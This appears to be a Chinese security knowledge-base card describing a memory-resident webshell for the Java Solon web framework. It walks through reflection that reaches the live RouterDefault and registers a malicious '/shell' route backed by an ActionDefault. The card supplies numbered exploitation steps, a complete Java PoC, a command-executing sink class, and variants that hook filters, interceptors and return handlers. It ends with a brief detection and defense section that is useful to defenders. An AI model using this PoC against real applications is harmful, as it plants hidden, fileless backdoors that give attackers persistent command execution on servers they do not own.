---
id: web-java-framework-solon-route-memshell-routerdefault-add
title: Solon 路由内存马：Context.current 反查 AppContext，反射 RouterDefault.add 注册 ActionDefault 路由
type: scenario
domain: web
path: web/java/framework
technique: solon-route-memshell-routerdefault-add
tags:
- java
- solon
- memshell
- route
- routerdefault
- actiondefault
- reflection
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:50:21+08:00'
  notes: 已对照原文核对：attrMap→ATTR_MAIN_HANDLER→bWrap→BeanWrap.context→AppContext.app→SolonApp 父类 _router→RouterDefault，与原文 PoC 逐行一致（原文 _router 分支与 _chainManager 分支为并列两条）；RouterDefault#add(String,MethodType,int,Handler) 内 new RoutingDefault + table.add 与断点截图一致；BeanWrap(AppContext,Class)/ActionDefault(BeanWrap,Method) 构造与原文图14-17 一致。未验证点：原文仅在 Solon 3.0.5 + smart-http + JDK8 环境实测（/shell 弹计算器），未声明受影响版本区间，故未写 affected_versions；字段层级是否适用于其它版本未验证。
url: /docs/web/java/framework/web-java-framework-solon-route-memshell-routerdefault-add/
draft: false
kb_aliases:
- Solon 路由内存马
- Solon Controller 内存马
- RouterDefault.add
- ActionDefault BeanWrap 构造
- SolonApp._router 反射
---

## 一句话结论

Solon 把路由以 `RoutingDefault` 记录在 `RouterDefault.table` 里，`RouterDefault.add(path, method, index, handler)` 是唯一的写入点；在已有代码执行的前提下，从 `Context.current()` 沿 `attrMap → ATTR_MAIN_HANDLER → bWrap → context(AppContext) → app(SolonApp) → _router` 逐层反射拿到该 `RouterDefault`，用 `new BeanWrap(appContext, Evil.class)` + `new ActionDefault(beanWrap, Evil.class.getDeclaredMethod("shell"))` 构造 handler 再 `add("/shell", MethodType.ALL, 0, actionDefault)`，即可在运行中的应用里注册一条指向任意恶意类方法的新路由，访问即执行命令，无需落地文件、重启即消失。

## 原理

- **Solon 的请求处理分层**：`SolonApp` → `FilterChain`（Filter）→ `RouterHandler`/`RouterInterceptorChain` → 主 Handler（`Action`：`ActionExecuteHandler` → `InterceptorChain` → `ActionReturnHandler` → `render()`），每一层都有可插拔的注册表；Filter 在 `ChainManager`，路由与拦截器在 `RouterDefault`。原文的流程图与 add 方法列表（`addFilter`/`addFilterIfAbsent`/`addInterceptor`/`addExecuteHandler`/`addReturnHandler`）都印证这一点。
- **路由写入点唯一**：调试断点显示，框架初始化与运行时注册最终都调用 `org.noear.solon.core.route.RouterDefault#add(String path, MethodType method, int index, Handler handler)`，内部 `new RoutingDefault(path, method, index, handler)` 后 `this.table.add(routing)`；`table` 是 `RouterDefault` 的 `List` 字段。因此只要拿到活的 `RouterDefault` 实例并调用 `add`，新路由就与启动期注册的路由等价（在 `getAll()`/匹配逻辑里同权）。
- **handler 可由业务类构造**：`Handler` 是 `@FunctionalInterface`（`void handle(Context ctx)`），其实现之一 `ActionDefault(BeanWrap bWrap, Method method)` 会把「Bean 实例 + 该实例的方法」包装成 handler；`BeanWrap(AppContext context, Class<?> clz)` 负责实例化与管理。于是 `new ActionDefault(new BeanWrap(appContext, Evil.class), Evil.class.getDeclaredMethod("shell"))` 就是一个合法的路由 handler，`ActionDefault` 在调用时会反射执行 `Evil.shell()`。
- **可达性来自上下文对象图**：`Context.current()` 返回的 `SmHttpContext` 的父类持有 `attrMap`；其中 key `ATTR_MAIN_HANDLER` 指向当前 `ActionDefault`，其私有字段 `bWrap` → `BeanWrap`，`bWrap.context` → `AppContext`，`AppContext` 的父类 `app` 字段 → `SolonApp`（`SolonApp` 的父类持有 `_router` 与 `_chainManager`）。这条链从当前请求对象出发，全是框架自有对象，不依赖任何全局静态变量搜索，也不需要额外线程遍历。
- **为何等效于持久后门**：注册在内存中，属于当前应用实例的路由表；不产生新文件、不修改磁盘 class，重启后消失。原文实测 `POST/GET /shell` 触发 `Runtime.getRuntime().exec("calc")` 成功弹出计算器。

## 触发条件

- 目标为 Solon 框架（原文环境 Solon 3.0.5 + smart-http，JDK8）Java Web 应用，classpath 含 `org.noear.solon.core.route.RouterDefault`、`org.noear.solon.core.mvc.ActionDefault`、`org.noear.solon.core.BeanWrap`；
- 攻击者已有任意代码执行/类加载能力，能执行上述 Java 片段（例如反序列化、表达式注入、JSP 马、已有的其它内存马）；
- 执行发生在处理 HTTP 请求的线程内，`Context.current()` 非空；
- 字段层级（`attrMap`/`ATTR_MAIN_HANDLER`/`bWrap`/`context`/`app`/`_router`）与目标 Solon 版本一致（不同版本可能增减包装层）；
- 新路由未被前置网关/WAF 的路径白名单拦截。

## 利用步骤

1. 确认目标框架与版本：访问任意接口看响应头/错误页，或读取 classpath 中 `solon-*.jar` 版本（原文 3.0.5）。
2. 写一个可被 Web 访问触发的方法作为最终 sink，例如 `public class Evil { public void shell() throws IOException { Runtime.getRuntime().exec("calc"); } }`（不要加 `@Component`，避免被容器扫描后自动注册）。
3. 在已有代码执行点运行反射注册代码（见 PoC）：取 `Context.current()`，逐层取到 `RouterDefault`，构造 `BeanWrap`/`ActionDefault`，`add("/shell", MethodType.ALL, 0, actionDefault)`。
4. 访问 `/shell` 验证：命令执行生效（原文弹出计算器）。若 `add` 抛异常，先打印各层对象的 `getClass()` 与字段名，确认版本差异。
5. 换路径/换方法复用：`add` 的第二个参数可用 `MethodType.GET`/`POST` 限定触发方式，第三个参数 index 控制优先级（越小越优先）。
6. 若要更强驻留，可同时注册 `RouterInterceptor`（`pathPatterns().include("/cmd")`）或 `ActionReturnHandler`（`matched` 恒真、在 `returnHandle` 里取 `ctx.param("cmd")`），把入口混入既有路由的拦截/返回阶段。

## PoC

```java
// 在已有代码执行点内运行（原文 addcontrollermemshell 的写法）
Context context = Context.current();
Class<?> superclass = context.getClass().getSuperclass().getSuperclass();
Field attrMap = superclass.getDeclaredField("attrMap");
attrMap.setAccessible(true);
Map o = (Map) attrMap.get(context);

Object actiondefault = o.get("ATTR_MAIN_HANDLER");
Class<?> aClass = actiondefault.getClass();
Field bWrap = aClass.getDeclaredField("bWrap");
bWrap.setAccessible(true);
Object o1 = bWrap.get(actiondefault);

Class<?> aClass1 = o1.getClass();
Field context1 = aClass1.getDeclaredField("context");
context1.setAccessible(true);
AppContext o2 = (AppContext) context1.get(o1);

Class<?> aClass2 = o2.getClass().getSuperclass();
Field app = aClass2.getDeclaredField("app");
app.setAccessible(true);
Object o3 = app.get(o2);

Class<?> aClass3 = o3.getClass().getSuperclass();
Field router = aClass3.getDeclaredField("_router");   // Filter 版本这里是 _chainManager
router.setAccessible(true);
RouterDefault o4 = (RouterDefault) router.get(o3);

BeanWrap beanWrap = new BeanWrap(o2, Evil.class);
Method shell = Evil.class.getDeclaredMethod("shell");
ActionDefault actionDefault = new ActionDefault(beanWrap, shell);
o4.add("/shell", MethodType.ALL, 0, actionDefault);
```

```http
GET /shell HTTP/1.1
Host: <target>
```

（原文另有 `GET /addfiltermemshell`、`GET /addcontrollermemshell` 两个一次性注册端点，返回 `Filtermemshell add successfully!` / `controllermemshell add successfully!`；注册后 `/shell` 弹出计算器。）

## 变体与关联

- 变体：不构造 `ActionDefault`，直接把 `table` 字段（`List`）取出后自己 `add` 一个 `RoutingDefault`——跳过 `add` 方法但需自行满足泛型与 `RoutingDefault` 构造参数。
- 变体：同一对象图里把 `_router` 换成父类的 `_chainManager`，调用 `addFilter`/`addFilterIfAbsent`/`addInterceptor`/`addInterceptorIfAbsent`/`addExecuteHandler`/`addReturnHandler`，即可把恶意实现挂到 Filter、路由拦截器、执行处理器、返回处理器任一阶段（原文给出了四类接口实现的骨架与 `pathPatterns().include("/cmd")` 写法）。
- 变体：用 java-object-searcher（`SearchRequstByBFS(Thread.currentThread(), keys)` + `setMax_search_depth(20)`）按字段名 `_chainManager`/`_router` 从线程对象图直接搜到目标实例，省去逐层 `getDeclaredField`（原文用于确认链路，见「检测与防御」的可观测性含义）。
- 关联：[[web-java-framework-solon-filter-memshell-chainmanager-reflect]]（同框架的 Filter 内存马，走 `request()`→`serverHandler`→`handler`→`arg$1` 另一条反射路径拿 `_chainManager`；本卡走 `attrMap`→`ATTR_MAIN_HANDLER`→`bWrap`→`app` 路径并注册**路由**，两条路径与两个注册表不同）。
- 关联：[[web-java-framework-blade-route-memshell]]（另一框架的 Route 内存马，机制同为「反射路由注册表 + addRoute/register」）。
- 边界：需要先有代码执行；字段名随版本变化；内存马不落地，重启失效；注册的恶意类不能带框架自动装配注解，否则会在启动期被正常加载（那就不是内存马而是持久后门，且容易被发现）。

## 检测与防御

- 检测：运行时枚举 `RouterDefault.table` 与 `ChainManager` 各 hook 列表，核对是否存在非启动期注册、来源类不含 `@Controller`/`@Component` 的路由；关注请求处理链中出现的未知 `ActionDefault`（其 `bWrap.clz` 指向非业务包）；对包含 `ATTR_MAIN_HANDLER`、`_router`、`RouterDefault.add` 字符串的类做重点排查。
- 防御：反序列化/表达式白名单禁止反射到框架内部字段；升级 Solon 后字段名会变化，可作为降低通用性的临时手段但不可依赖；部署 RASP/内存马扫描（如 java-memshell-scanner、Arthas `sc`/`jad` 排查），并对运行期新增路由做审计告警。
